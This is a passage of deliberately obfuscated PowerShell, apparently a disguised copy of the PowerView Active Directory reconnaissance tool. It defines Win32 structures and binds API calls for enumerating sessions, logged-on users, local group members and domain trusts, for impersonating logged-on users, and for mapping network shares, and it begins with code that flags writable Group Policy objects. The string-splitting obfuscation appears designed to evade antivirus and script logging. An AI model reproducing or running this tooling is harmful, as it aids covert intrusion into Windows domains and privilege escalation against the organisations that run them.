            ${a`Cl} = ([ADSI]${g`po}."Pa`Th")."o`BJECtSECuR`I`Ty"."Acc`esS" | &('?') {${_}."aCTIV`eDI`REc`TO`RYr`iG`hTs" -match ("{0}{1}"-f'Wr','ite') -and ${_}."aCC`eSSC`onTrol`TYpe" -eq ("{1}{0}" -f 'w','Allo') -and  ${Ex`cLus`IONS} -notcontains ${_}."iDEntitY`R`EferE`NCe".("{0}{1}{2}"-f 't','oS','tring').Invoke().("{1}{0}" -f'plit','s').Invoke("\")[1] -and ${_}."IDen`T`i`TyR`efErEnCE" -ne ("{0}{1}{2}{3}" -f 'CREATO','R',' OW','NER')}
        if (${A`cL} -ne ${nu`lL}){
            ${gp`OA`cl} = &("{1}{2}{0}" -f'ct','N','ew-Obje') ("{1}{0}" -f 't','psobjec')
            ${GP`oAcl} | &("{2}{0}{1}"-f'd-M','ember','Ad') ("{2}{0}{1}" -f'otep','roperty','N') ("{1}{0}"-f'Path','ADS') ${G`po}."pRO`p`eRtIeS"."aD`sPatH"
            ${gPo`ACl} | &("{0}{2}{1}"-f'A','ber','dd-Mem') ("{0}{2}{1}{3}" -f'Not','pr','e','operty') ("{0}{2}{3}{4}{1}" -f 'GPODi','me','spl','ay','Na') ${G`PO}."pr`OP`Erti`eS"."d`i`SPLAyNA`Me"
            ${gPO`ACL} | &("{0}{2}{1}" -f 'Add-Me','r','mbe') ("{0}{1}{2}" -f 'No','teprop','erty') ("{0}{3}{4}{2}{1}" -f'I','ce','en','dentity','Refer') ${a`Cl}."IDE`NtIt`YRE`FE`REnCE"
            ${G`p`OACL} | &("{0}{2}{1}"-f 'Add-','r','Membe') ("{0}{1}{2}" -f 'Note','pro','perty') ("{4}{3}{0}{2}{1}"-f 'Directory','ghts','Ri','ve','Acti') ${A`Cl}."a`ctIv`Edi`R`e`CtoRyrIG`HTs"
            ${gp`oA`Cl}
        }
        }
    }
}











${m`oD} = &("{1}{3}{0}{2}{5}{4}"-f '-InMem','Ne','ory','w','ule','Mod') -ModuleName ("{0}{1}"-f'Win','32')




${SamA`c`CoUntT`YPeENum} = &("{0}{1}"-f'psen','um') ${m`od} ("{3}{1}{5}{2}{0}{6}{4}" -f 'un','rVi','w.SamAcco','Powe','Enum','e','tType') ("{1}{0}{2}"-f'In','U','t32') @{
    ("{2}{1}{3}{0}"-f 'CT','A','DOM','IN_OBJE')                   =   ("{0}{1}{2}{3}"-f '0x','000000','0','0')
    ("{2}{0}{3}{1}" -f 'OU','JECT','GR','P_OB')                    =   ("{1}{0}{2}" -f'000','0x10','000')
    ("{3}{6}{0}{5}{1}{2}{4}"-f 'GROU','_OB','JEC','NON_','T','P','SECURITY_')       =   ("{2}{0}{1}" -f'x1000','0001','0')
    ("{3}{0}{2}{1}" -f 'A','_OBJECT','S','ALI')                    =   ("{0}{1}{2}"-f '0x','20','000000')
    ("{0}{2}{1}{3}{4}" -f'N','CURITY_ALIAS','ON_SE','_O','BJECT')       =   ("{1}{3}{0}{2}" -f'0','0x','001','2000')
    ("{2}{1}{3}{0}"-f'T','SER_OBJE','U','C')                     =   ("{2}{0}{1}" -f'000','0000','0x3')
    ("{1}{0}{3}{4}{2}"-f 'CHINE','MA','CCOUNT','_','A')                 =   ("{2}{0}{1}" -f '00','0001','0x30')
    ("{1}{2}{0}"-f 'COUNT','TRUST_','AC')                   =   ("{2}{1}{0}{3}" -f '0','x3','0','000002')
    ("{1}{4}{3}{0}{2}"-f'_','APP_BA','GROUP','IC','S')                 =   ("{1}{0}{2}"-f'4','0x','0000000')
    ("{3}{1}{2}{0}"-f 'Y_GROUP','E','R','APP_QU')                 =   ("{2}{0}{1}" -f '0','0001','0x400')
    ("{0}{2}{1}{3}" -f 'A','COUNT_T','C','YPE_MAX')                =   ("{2}{1}{0}" -f 'ff','x7fffff','0')
}


${GR`o`UPt`YpeEn`UM} = &("{1}{0}"-f'm','psenu') ${M`OD} ("{0}{4}{6}{2}{1}{3}{7}{5}"-f'P','.','w','Group','owe','num','rVie','TypeE') ("{0}{1}" -f 'U','Int32') @{
    ("{3}{0}{2}{1}{4}" -f'RE','_','ATED','C','BY_SYSTEM')               =   ("{1}{2}{3}{0}"-f'001','0','x','00000')
    ("{2}{0}{1}" -f 'SC','OPE','GLOBAL_')                    =   ("{1}{0}{2}" -f'00','0x000','002')
    ("{4}{3}{2}{5}{0}{1}"-f'AL_','SCOPE','N','AI','DOM','_LOC')              =   ("{0}{1}{2}"-f '0x0','0','000004')
    ("{0}{3}{1}{2}" -f'UNIV','L_','SCOPE','ERSA')                 =   ("{2}{1}{0}"-f '000008','00','0x')
    ("{1}{2}{0}" -f 'C','APP_B','ASI')                       =   ("{2}{3}{0}{1}"-f'00000','10','0x','0')
    ("{1}{2}{3}{0}" -f'RY','A','P','P_QUE')                       =   ("{2}{1}{0}"-f '0','0002','0x000')
    ("{2}{0}{1}" -f'I','TY','SECUR')                        =   ("{2}{1}{0}"-f '0000','0','0x800')
} -Bitfield


${u`A`ceNUm} = &("{1}{0}"-f'enum','ps') ${m`oD} ("{4}{2}{1}{0}{5}{3}" -f'C','A','iew.U','um','PowerV','En') ("{1}{0}" -f'2','UInt3') @{
    ("{1}{0}"-f'CRIPT','S')                          =   1
    ("{0}{2}{1}{3}"-f 'ACCOUNTD','SA','I','BLE')                  =   2
    ("{4}{3}{2}{0}{1}" -f '_REQ','UIRED','IR','ED','HOM')                =   8
    ("{0}{2}{1}" -f'LOC','T','KOU')                         =   16
    ("{2}{3}{1}{0}"-f'NOTREQD','_','PA','SSWD')                  =   32
    ("{3}{0}{1}{2}" -f'SS','WD_CANT_','CHANGE','PA')              =   64
    ("{2}{4}{3}{0}{5}{1}{6}" -f'D_TEXT_PW','AL','ENCR','E','YPT','D_','LOWED')      =   128
    ("{3}{4}{2}{6}{1}{5}{0}"-f'T','E_ACC','A','TEMP','_DUPLIC','OUN','T')          =   256
    ("{2}{0}{1}"-f'ACCO','UNT','NORMAL_')                  =   512
    ("{2}{3}{0}{4}{1}"-f'N_T','OUNT','INTERD','OMAI','RUST_ACC')       =   2048
    ("{0}{1}{3}{2}{6}{4}{5}" -f'WORK','STA','N','TIO','TRUST_ACCOU','NT','_')       =   4096
    ("{3}{4}{0}{5}{1}{2}" -f '_TRUST_','UN','T','S','ERVER','ACCO')            =   8192
    ("{4}{3}{5}{0}{2}{1}"-f'PIRE_PAS','ORD','SW','ONT','D','_EX')            =   65536
    ("{2}{4}{1}{0}{3}" -f 'O','_LOGON_ACC','M','UNT','NS')               =   131072
    ("{4}{0}{2}{1}{3}"-f 'MA','ARD_R','RTC','EQUIRED','S')              =   262144
    ("{4}{2}{5}{0}{1}{3}"-f'_FO','R','T','_DELEGATION','TRUS','ED')          =   524288
    ("{1}{3}{2}{0}"-f'ED','NOT_DEL','GAT','E')                   =   1048576
    ("{0}{3}{1}{2}" -f'USE_DES','KEY','_ONLY','_')                =   2097152
    ("{3}{1}{2}{0}" -f'PREAUTH','ONT','_REQ_','D')                =   4194304
    ("{3}{1}{2}{0}"-f 'IRED','SSWORD_','EXP','PA')                =   8388608
    ("{3}{2}{0}{6}{5}{4}{1}" -f'_AUTH_FO','N','ED_TO','TRUST','EGATIO','L','R_DE')  =   16777216
    ("{2}{1}{3}{4}{0}"-f 'NT','_SEC','PARTIAL','RETS_A','CCOU')         =   67108864
} -Bitfield


${WTscOnneCT`sT`A`TE} = &("{1}{0}" -f'm','psenu') ${m`od} ("{4}{5}{3}{6}{0}{1}{2}" -f'TA','T','E_CLASS','T','WTS_CONN','EC','S') ("{1}{0}" -f't16','UIn') @{
    ("{0}{2}{1}"-f'A','ive','ct')       =    0
    ("{2}{0}{1}" -f 'ct','ed','Conne')    =    1
    ("{0}{3}{1}{2}"-f'Con','uer','y','nectQ') =    2
    ("{0}{1}{2}" -f'S','h','adow')       =    3
    ("{2}{1}{0}"-f'd','cte','Disconne') =    4
    ("{0}{1}" -f'Idl','e')         =    5
    ("{0}{1}" -f 'Lis','ten')       =    6
    ("{0}{1}" -f 'Rese','t')        =    7
    ("{1}{0}" -f 'own','D')         =    8
    ("{1}{0}"-f 'nit','I')         =    9
}


${wTs`_`SESsI`oN_Info_1} = &("{1}{2}{0}"-f 'uct','s','tr') ${M`oD} ("{0}{2}{4}{6}{3}{5}{1}"-f'Po','ionInfo','werView','s','.RDP','s','Se') @{
    ("{1}{0}" -f'ecEnvId','Ex') = &("{0}{1}" -f 'fi','eld') 0 ("{0}{1}"-f 'UInt3','2')
    ("{0}{1}" -f 'Stat','e') = &("{1}{0}"-f'ld','fie') 1 ${WTsc`oN`Ne`cTStAtE}
    ("{1}{0}{3}{2}"-f's','Ses','Id','ion') = &("{1}{0}" -f 'ld','fie') 2 ("{0}{1}{2}" -f'UIn','t3','2')
    ("{2}{0}{1}" -f 'Ses','sionName','p') = &("{0}{1}"-f'fie','ld') 3 ("{2}{0}{1}" -f'in','g','Str') -MarshalAs @(("{2}{1}{0}" -f'Str','W','LP'))
    ("{1}{0}" -f'Name','pHost') = &("{1}{0}"-f 'd','fiel') 4 ("{0}{1}" -f 'Str','ing') -MarshalAs @(("{1}{0}"-f 'tr','LPWS'))
    ("{1}{0}{2}"-f 'U','p','serName') = &("{0}{1}" -f'fie','ld') 5 ("{1}{2}{0}"-f 'g','St','rin') -MarshalAs @(("{0}{1}"-f 'LPWS','tr'))
    ("{1}{3}{2}{0}" -f 'me','pDo','inNa','ma') = &("{1}{0}" -f 'ld','fie') 6 ("{1}{2}{0}"-f'ing','St','r') -MarshalAs @(("{0}{1}" -f'LP','WStr'))
    ("{2}{0}{1}{3}"-f'F','armN','p','ame') = &("{0}{1}"-f 'fi','eld') 7 ("{0}{2}{1}"-f'Stri','g','n') -MarshalAs @(("{0}{1}"-f'LPW','Str'))
}


${WTS`_C`lient_aD`DResS} = &("{2}{0}{1}" -f'truc','t','s') ${M`Od} ("{5}{0}{1}{2}{3}{4}" -f'CLIEN','T_A','D','DRES','S','WTS_') @{
    ("{0}{1}{2}" -f'Addres','s','Family') = &("{1}{0}" -f'ld','fie') 0 ("{1}{0}"-f'32','UInt')
    ("{0}{2}{1}"-f 'Ad','ress','d') = &("{1}{0}" -f 'd','fiel') 1 ("{0}{1}"-f'Byte[',']') -MarshalAs @(("{1}{0}{2}"-f'Arra','ByVal','y'), 20)
}


${SHARE_`i`NfO_1} = &("{2}{1}{0}"-f'ruct','t','s') ${M`Od} ("{0}{6}{2}{3}{5}{4}{1}" -f'P','Info','i','e','Share','w.','owerV') @{
    ("{0}{1}"-f 'Na','me') = &("{1}{0}"-f 'ld','fie') 0 ("{1}{0}"-f 'ng','Stri') -MarshalAs @(("{1}{0}"-f'Str','LPW'))
    ("{1}{0}" -f 'ype','T') = &("{1}{0}"-f'd','fiel') 1 ("{0}{1}" -f'UInt3','2')
    ("{0}{1}" -f 'Remar','k') = &("{1}{0}"-f 'eld','fi') 2 ("{0}{1}" -f 'S','tring') -MarshalAs @(("{0}{1}" -f'LPWS','tr'))
}


${W`Kst`A`_user_`INFo_1} = &("{1}{0}" -f 'ct','stru') ${m`OD} ("{5}{1}{2}{4}{0}{3}{7}{6}"-f 'n','iew.','Lo','Use','ggedO','PowerV','nfo','rI') @{
    ("{0}{1}" -f'U','serName') = &("{0}{1}"-f 'fi','eld') 0 ("{2}{0}{1}" -f 'tr','ing','S') -MarshalAs @(("{1}{2}{0}"-f 'tr','L','PWS'))
    ("{2}{3}{0}{1}"-f 'o','main','Logon','D') = &("{0}{1}" -f'fie','ld') 1 ("{2}{1}{0}" -f'ing','tr','S') -MarshalAs @(("{1}{2}{0}" -f 'r','L','PWSt'))
    ("{1}{2}{0}" -f 'Domains','Aut','h') = &("{1}{0}"-f 'd','fiel') 2 ("{0}{2}{1}" -f 'St','ing','r') -MarshalAs @(("{1}{0}" -f'r','LPWSt'))
    ("{3}{2}{0}{1}"-f 'nServ','er','o','Log') = &("{0}{1}"-f'f','ield') 3 ("{1}{0}"-f'tring','S') -MarshalAs @(("{0}{1}" -f'LPW','Str'))
}


${seSS`I`on`_in`Fo_10} = &("{0}{1}"-f 'struc','t') ${M`od} ("{3}{1}{0}{2}{4}"-f'nIn','essio','f','PowerView.S','o') @{
    ("{1}{0}"-f 'me','CNa') = &("{0}{1}" -f 'fi','eld') 0 ("{0}{1}" -f'Stri','ng') -MarshalAs @(("{2}{0}{1}" -f 'PWS','tr','L'))
    ("{0}{1}{2}" -f'U','s','erName') = &("{0}{1}"-f'fi','eld') 1 ("{1}{0}{2}"-f'rin','St','g') -MarshalAs @(("{1}{0}"-f'WStr','LP'))
    ("{1}{0}" -f'me','Ti') = &("{0}{1}"-f 'f','ield') 2 ("{0}{2}{1}"-f'UInt','2','3')
    ("{1}{0}"-f'eTime','Idl') = &("{0}{1}"-f 'fiel','d') 3 ("{1}{0}"-f '32','UInt')
}


${si`d`_n`AM`e_Use} = &("{0}{1}"-f 'p','senum') ${m`od} ("{1}{0}{2}"-f'ME_','SID_NA','USE') ("{0}{1}{2}" -f'UI','nt','16') @{
    ("{3}{2}{1}{0}" -f'ser','peU','Ty','Sid')             = 1
    ("{1}{2}{0}" -f 'oup','Si','dTypeGr')            = 2
    ("{1}{0}{3}{4}{2}"-f 'idT','S','omain','yp','eD')           = 3
    ("{0}{1}{3}{2}"-f'S','idTy','eAlias','p')            = 4
    ("{2}{3}{0}{1}{4}" -f 'w','nGrou','SidType','WellKno','p')   = 5
    ("{2}{5}{6}{0}{3}{1}{4}" -f'edAc','u','Si','co','nt','dT','ypeDelet')   = 6
    ("{0}{1}{3}{2}" -f'SidTypeI','nv','lid','a')          = 7
    ("{1}{3}{2}{0}" -f'ypeUnknown','S','dT','i')          = 8
    ("{0}{1}{2}"-f'S','id','TypeComputer')         = 9
}


${Lo`c`AlgRO`UP_iNfo`_1} = &("{1}{0}" -f 'ruct','st') ${m`od} ("{2}{3}{1}{0}{4}" -f 'LGR','A','L','OC','OUP_INFO_1') @{
    ("{1}{3}{2}{0}"-f'name','lgr','_','pi1') = &("{0}{1}"-f'fie','ld') 0 ("{0}{1}" -f 'St','ring') -MarshalAs @(("{1}{0}" -f'Str','LPW'))
    ("{2}{3}{1}{0}"-f'ent','mm','lgrpi','1_co') = &("{0}{1}" -f'fie','ld') 1 ("{0}{2}{1}"-f 'Str','ng','i') -MarshalAs @(("{1}{0}{2}"-f 'PW','L','Str'))
}


${L`OC`A`lGR`OUp_mEM`BErs_iNFO_2} = &("{1}{0}"-f'truct','s') ${m`od} ("{4}{7}{1}{5}{2}{6}{3}{0}"-f '_2','ALG','P_MEMBERS','NFO','L','ROU','_I','OC') @{
    ("{2}{3}{0}{1}" -f '2','_sid','lgr','mi') = &("{1}{0}"-f 'eld','fi') 0 ("{1}{2}{0}"-f 'Ptr','In','t')
    ("{2}{3}{0}{1}"-f 'us','age','lgrmi2_si','d') = &("{0}{1}" -f'fi','eld') 1 ${SID_na`m`e_`Use}
    ("{6}{5}{4}{1}{0}{3}{2}" -f'n','mi2_domai','dname','an','r','g','l') = &("{1}{0}"-f 'd','fiel') 2 ("{1}{0}"-f'g','Strin') -MarshalAs @(("{1}{0}" -f'PWStr','L'))
}


${dS`d`oM`AI`NflAG} = &("{0}{1}"-f 'p','senum') ${m`od} ("{0}{3}{2}{1}" -f 'Ds','s','Flag','Domain.') ("{1}{0}" -f'2','UInt3') @{
    ("{2}{0}{1}" -f'_FORE','ST','IN')       = 1
    ("{1}{2}{3}{0}{4}"-f 'OUTBO','DIR','ECT','_','UND') = 2
    ("{0}{1}{2}"-f'TREE_','RO','OT')       = 4
    ("{0}{1}"-f 'PRIMA','RY')         = 8
    ("{2}{1}{0}" -f'E','IVE_MOD','NAT')     = 16
    ("{1}{0}{2}"-f '_I','DIRECT','NBOUND')  = 32
} -Bitfield
${Ds`doMA`in`TrustTY`Pe} = &("{0}{1}"-f 'p','senum') ${M`Od} ("{2}{1}{0}{5}{3}{4}" -f 'main.','Do','Ds','s','tType','Tru') ("{0}{1}"-f'UInt3','2') @{
    ("{0}{2}{1}"-f 'DOWNLE','EL','V')   = 1
    ("{2}{0}{1}" -f'VE','L','UPLE')     = 2
    ("{0}{1}" -f 'MI','T')         = 3
    ("{1}{0}" -f'E','DC')         = 4
}
${dSD`OMaIn`TR`UsTaTTri`B`UtES} = &("{0}{1}" -f'psenu','m') ${M`od} ("{1}{5}{4}{7}{6}{0}{2}{3}"-f'tA','DsD','ttribu','tes','.','omain','s','Tru') ("{0}{1}{2}" -f 'U','I','nt32') @{
    ("{3}{0}{1}{2}"-f '_TRANS','ITIV','E','NON')      = 1
    ("{2}{3}{0}{1}" -f'VEL_ON','LY','U','PLE')        = 2
    ("{1}{0}{3}{2}" -f 'ER','FILT','S','_SID')         = 4
    ("{1}{0}{2}{3}" -f 'O','F','REST_T','RANSITIVE')   = 8
    ("{2}{0}{4}{3}{1}"-f '_OR','ION','CROSS','ZAT','GANI')  = 16
    ("{0}{2}{1}" -f 'WIT','IN_FOREST','H')       = 32
    ("{1}{3}{0}{2}{4}" -f 'E','TREAT','X','_AS_','TERNAL')   = 64
}


${Ds_`D`OMA`IN`_trUSTS} = &("{0}{1}" -f 'stru','ct') ${m`Od} ("{1}{2}{0}{4}{3}"-f '_TR','D','S_DOMAIN','TS','US') @{
    ("{4}{0}{1}{2}{3}" -f 'b','iosDo','mainN','ame','Net') = &("{0}{1}" -f 'fiel','d') 0 ("{0}{1}"-f'Str','ing') -MarshalAs @(("{1}{2}{0}"-f'tr','LPW','S'))
    ("{0}{3}{4}{1}{2}" -f 'Dns','am','e','Do','mainN') = &("{1}{0}" -f 'ield','f') 1 ("{0}{1}{2}" -f 'Str','i','ng') -MarshalAs @(("{0}{1}" -f'LPW','Str'))
    ("{0}{1}"-f 'F','lags') = &("{1}{0}" -f'ield','f') 2 ${DS`do`mai`Nfl`AG}
    ("{0}{1}{2}"-f 'Paren','tInd','ex') = &("{1}{0}" -f'ield','f') 3 ("{1}{0}"-f'2','UInt3')
    ("{0}{2}{1}" -f'Trust','pe','Ty') = &("{0}{1}" -f'fiel','d') 4 ${Dsd`o`m`A`Int`RuSTtYPE}
    ("{4}{2}{0}{3}{1}" -f 't','utes','ustAt','rib','Tr') = &("{0}{1}"-f 'fi','eld') 5 ${D`s`DOmaiNt`RUSTATtR`i`BUteS}
    ("{0}{1}{2}"-f'Doma','in','Sid') = &("{1}{0}" -f'd','fiel') 6 ("{0}{1}"-f 'In','tPtr')
    ("{1}{2}{0}"-f'uid','Doma','inG') = &("{0}{1}" -f'fie','ld') 7 ("{0}{1}" -f 'Gu','id')
}


${nE`TrE`s`oURC`ew} = &("{0}{1}" -f 'st','ruct') ${m`Od} ("{2}{3}{1}{0}" -f 'EW','ESOURC','N','ETR') @{
    ("{2}{1}{0}" -f 'e','wScop','d') =         &("{1}{0}" -f'ield','f') 0 ("{2}{1}{0}" -f't32','In','U')
    ("{1}{0}" -f'e','dwTyp') =          &("{0}{1}" -f'f','ield') 1 ("{0}{1}"-f'UInt3','2')
    ("{0}{2}{1}{3}" -f 'd','Display','w','Type') =   &("{0}{1}" -f 'fiel','d') 2 ("{0}{1}{2}"-f 'UIn','t','32')
    ("{1}{0}" -f'sage','dwU') =         &("{1}{0}" -f'eld','fi') 3 ("{2}{1}{0}" -f'nt32','I','U')
    ("{0}{2}{1}"-f'l','lName','pLoca') =     &("{1}{0}"-f 'ield','f') 4 ("{0}{1}" -f'S','tring') -MarshalAs @(("{1}{0}{2}" -f'WS','LP','tr'))
    ("{1}{0}{2}"-f'pRemot','l','eName') =    &("{0}{1}" -f 'f','ield') 5 ("{1}{0}" -f 'ing','Str') -MarshalAs @(("{0}{2}{1}" -f 'LPW','tr','S'))
    ("{1}{0}"-f 'Comment','lp') =       &("{0}{1}" -f'f','ield') 6 ("{1}{2}{0}"-f'ring','S','t') -MarshalAs @(("{1}{2}{0}" -f'r','LPWS','t'))
    ("{0}{1}{2}" -f'l','pP','rovider') =      &("{0}{1}" -f'f','ield') 7 ("{1}{0}{2}" -f 'tri','S','ng') -MarshalAs @(("{2}{0}{1}"-f 'WS','tr','LP'))
}


${fuN`cTiONDeFi`NITI`ONS} = @(
    (&("{1}{0}"-f'nc','fu') ("{0}{2}{1}"-f'ne','2','tapi3') ("{2}{0}{1}" -f'Enu','m','NetShare') ([Int]) @([String], [Int],   ${O`y9}.("{1}{0}{2}" -f'Typ','MakeByRef','e').Invoke(), [Int],   ${Ipl`6OU}.("{3}{0}{2}{1}" -f 'ByRefT','pe','y','Make').Invoke(),  ${iPl6`Ou}.("{0}{3}{1}{2}"-f'MakeB','Re','fType','y').Invoke(),   (  &("{1}{0}"-f 'I','gc')  ('v'+'Aria'+'blE:Ipl6'+'o'+'U'))."val`Ue".("{2}{0}{3}{1}" -f'keBy','pe','Ma','RefTy').Invoke())),
    (&("{0}{1}"-f'fu','nc') ("{1}{0}"-f'i32','netap') ("{0}{4}{1}{2}{3}"-f 'N','W','kstaUs','erEnum','et') ([Int]) @([String], [Int],   (&("{1}{0}{3}{2}" -f '-v','GET','e','ArIAbL')  ("oy"+"9")  )."v`Alue".("{2}{1}{0}{3}" -f'ByRefT','e','Mak','ype').Invoke(), [Int],   (&("{1}{2}{0}" -f'bLe','gET-V','ARiA') ("IP"+"l6"+"oU") -VAlU).("{2}{1}{3}{0}" -f'fType','keBy','Ma','Re').Invoke(),   ${ip`l`6oU}.("{2}{3}{0}{4}{1}"-f'yR','e','M','akeB','efTyp').Invoke(),   ${i`p`l6oU}.("{1}{3}{0}{2}"-f 'fTyp','Ma','e','keByRe').Invoke())),
    (&("{0}{1}"-f'f','unc') ("{0}{2}{1}" -f 'n','32','etapi') ("{1}{0}{2}"-f'essio','NetS','nEnum') ([Int]) @([String], [String], [String], [Int],  (&("{1}{2}{0}" -f'-iTEm','g','et') ('vAri'+'ABl'+'e:OY'+'9')  )."V`ALUE".("{2}{0}{1}" -f 'keBy','RefType','Ma').Invoke(), [Int],   (  &("{0}{1}" -f'D','iR') ('V'+'a'+'riABLE:iPL6'+'OU')  )."VA`LuE".("{1}{3}{2}{0}"-f'e','M','ByRefTyp','ake').Invoke(),   ( &("{0}{1}{2}"-f'Va','RiA','BLE') ("{1}{0}"-f 'pl6Ou','I') -VAlUe).("{0}{1}{2}"-f 'MakeByRefT','y','pe').Invoke(),   (&("{0}{1}" -f'I','teM')  ("{2}{1}{0}" -f 'Pl6oU',':i','VaRiAble'))."v`AlUe".("{2}{0}{4}{1}{3}" -f'e','RefTyp','Mak','e','By').Invoke())),
    (&("{0}{1}"-f 'fun','c') ("{1}{0}{2}"-f 'p','neta','i32') ("{1}{2}{5}{0}{4}{3}"-f'roupE','Ne','t','m','nu','LocalG') ([Int]) @([String], [Int],  ${o`Y9}.("{0}{1}{2}"-f'Ma','keByRe','fType').Invoke(), [Int],   ${i`pl`6ou}.("{2}{0}{3}{1}" -f'akeByR','ype','M','efT').Invoke(),  ${ipl`6oU}.("{1}{0}{2}{3}{4}" -f 'eByRef','Mak','T','yp','e').Invoke(),   ( &("{0}{2}{1}"-f 'ch','M','ildiTE')  ("{0}{1}{3}{2}" -f'VArIaBLE:i','PL','Ou','6'))."V`AlUe".("{1}{2}{3}{0}{4}" -f 'RefT','M','akeB','y','ype').Invoke())),
    (&("{1}{0}" -f 'c','fun') ("{1}{2}{0}" -f'32','n','etapi') ("{2}{1}{3}{0}" -f 'mbers','GroupGet','NetLocal','Me') ([Int]) @([String], [String], [Int],   (&('gi')  ("varI"+"a"+"Ble:Oy9") )."V`ALUE".("{4}{2}{3}{1}{0}" -f 'e','fTyp','keBy','Re','Ma').Invoke(), [Int],   ( &("{1}{3}{0}{2}" -f'BL','geT-V','E','ariA')  ('IpL'+'6ou') )."V`ALUE".("{3}{1}{0}{2}"-f'keB','a','yRefType','M').Invoke(),   (  &("{1}{2}{0}" -f 'lE','get','-VARIAB')  ('I'+'PL'+'6oU')  )."va`Lue".("{2}{1}{3}{0}" -f'pe','ef','MakeByR','Ty').Invoke(),  (&("{1}{3}{4}{0}{2}"-f 'TE','G','m','et-c','hildi') ("{2}{0}{1}{3}"-f 'ARI','ABLE:IPl6o','v','U')  )."vAl`UE".("{0}{1}{2}" -f'Mak','eByRef','Type').Invoke())),
    (&("{1}{0}"-f'unc','f') ("{2}{0}{1}"-f'api','32','net') ("{0}{2}{3}{1}"-f'Ds','e','GetSiteN','am') ([Int]) @([String],   ${o`y9}.("{0}{2}{3}{1}"-f 'Make','Type','ByR','ef').Invoke())),
    (&("{1}{0}" -f 'unc','f') ("{2}{1}{0}" -f'2','i3','netap') ("{1}{3}{2}{5}{4}{0}"-f'sts','Ds','ateDomai','Enumer','u','nTr') ([Int]) @([String], [UInt32],   ${o`Y9}.("{1}{0}{3}{2}{4}" -f 'akeBy','M','fT','Re','ype').Invoke(),  ( &("{1}{0}{3}{2}"-f'aRI','GeT-V','E','abl')  ('oY'+'9'))."v`AlUE".("{0}{3}{1}{2}" -f'MakeBy','p','e','RefTy').Invoke())),
    (&("{0}{1}"-f 'f','unc') ("{0}{2}{1}"-f'n','api32','et') ("{2}{1}{0}"-f'Free','ffer','NetApiBu') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'nc','fu') ("{0}{2}{1}" -f 'a','i32','dvap') ("{5}{4}{2}{1}{0}{3}"-f 'S','dToString','ertSi','id','onv','C') ([Int]) @([IntPtr],  (  &("{2}{0}{1}"-f'H','IldiTEM','c')  ("VAria"+"bl"+"E:Q"+"1y")  )."v`ALue".("{2}{1}{3}{0}" -f'pe','eByR','Mak','efTy').Invoke()) -SetLastError),
    (&("{0}{1}" -f'fun','c') ("{2}{0}{1}"-f 'a','pi32','adv') ("{0}{1}{2}{3}{4}" -f 'OpenSC','M','an','age','rW') ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&("{0}{1}"-f'f','unc') ("{2}{0}{1}"-f'pi3','2','adva') ("{0}{2}{1}{4}{3}"-f'Clo','erviceH','seS','ndle','a') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'c','fun') ("{1}{2}{0}" -f '2','ad','vapi3') ("{2}{0}{1}"-f'onUs','er','Log') ([Bool]) @([String], [String], [String], [UInt32], [UInt32],   (  &("{1}{0}{2}{3}" -f'eT','G','-CHild','ITEM')  ("vAr"+"ia"+"Bl"+"e:oy9")  )."VaL`Ue".("{1}{0}{2}{3}"-f'yRefT','MakeB','yp','e').Invoke()) -SetLastError),
    (&("{1}{0}" -f'nc','fu') ("{2}{1}{0}" -f'pi32','a','adv') ("{0}{1}{4}{5}{2}{3}" -f 'I','m','s','er','pers','onateLoggedOnU') ([Bool]) @([IntPtr]) -SetLastError),
    (&("{1}{0}" -f 'nc','fu') ("{1}{0}"-f'32','advapi') ("{3}{1}{0}{2}"-f'To','ert','Self','Rev') ([Bool]) @() -SetLastError),
    (&("{1}{0}" -f 'nc','fu') ("{1}{0}"-f'tsapi32','w') ("{1}{3}{0}{2}"-f 'rE','WTSOpenSer','x','ve') ([IntPtr]) @([String])),
    (&("{1}{0}"-f 'c','fun') ("{1}{0}{2}" -f'p','wtsa','i32') ("{4}{1}{3}{2}{0}" -f 'x','EnumerateS','sE','ession','WTS') ([Int]) @([IntPtr],   ${iP`l6oU}.("{0}{1}{2}" -f'Mak','eByRefT','ype').Invoke(), [Int],   (  &("{1}{0}" -f'TEM','i') ("{1}{0}{2}"-f':Oy','VaRIABle','9')  )."vaL`Ue".("{2}{3}{1}{0}"-f 'efType','yR','Mak','eB').Invoke(),   ${Ip`L6ou}.("{1}{0}{2}"-f'eByRefTy','Mak','pe').Invoke()) -SetLastError),
    (&("{0}{1}" -f 'fun','c') ("{1}{0}{2}"-f'tsa','w','pi32') ("{1}{4}{3}{0}{5}{2}{6}" -f 'ssi','W','Informatio','ySe','TSQuer','on','n') ([Int]) @([IntPtr], [Int], [Int],   (  &("{2}{0}{1}{3}" -f 'et-','VARiAbl','g','e') ("OY"+"9")  )."V`Alue".("{3}{0}{1}{2}" -f 'akeByRefT','y','pe','M').Invoke(),  (  &("{0}{1}" -f'G','cI')  ("vArI"+"ab"+"lE"+":ip"+"l6oU"))."VAl`UE".("{2}{1}{3}{0}" -f 'e','yRefT','MakeB','yp').Invoke()) -SetLastError),
    (&("{1}{0}"-f'unc','f') ("{1}{2}{0}"-f 'i32','wt','sap') ("{3}{1}{0}{2}"-f 'mor','TSFreeMe','yEx','W') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{0}{1}" -f 'fu','nc') ("{1}{2}{0}" -f '32','w','tsapi') ("{3}{1}{4}{0}{2}" -f'reeMem','TS','ory','W','F') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'unc','f') ("{1}{0}{2}" -f 'pi','wtsa','32') ("{2}{3}{1}{0}" -f 'ver','Ser','WTSClo','se') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f 'fun','c') ("{1}{0}" -f'pr','M') ("{2}{0}{4}{5}{1}{3}"-f 'dd','ct','WNetA','ion2W','Conn','e') ([Int]) @(${nEtR`Eso`U`Rcew}, [String], [String], [UInt32])),
    (&("{1}{0}" -f 'c','fun') ("{0}{1}"-f'Mp','r') ("{4}{0}{3}{6}{2}{1}{5}" -f 'NetCa','nnect','o','nc','W','ion2','elC') ([Int]) @([String], [Int], [Bool])),
    (&("{1}{0}" -f'nc','fu') ("{0}{1}" -f'kern','el32') ("{3}{2}{1}{0}" -f 'le','and','oseH','Cl') ([Bool]) @([IntPtr]) -SetLastError)
)

${tY`PES} = ${fu`NCtiond`EfIn`i`Ti`o`Ns} | &("{2}{0}{1}" -f'd','-Win32Type','Ad') -Module ${m`oD} -Namespace ("{0}{1}" -f'W','in32')
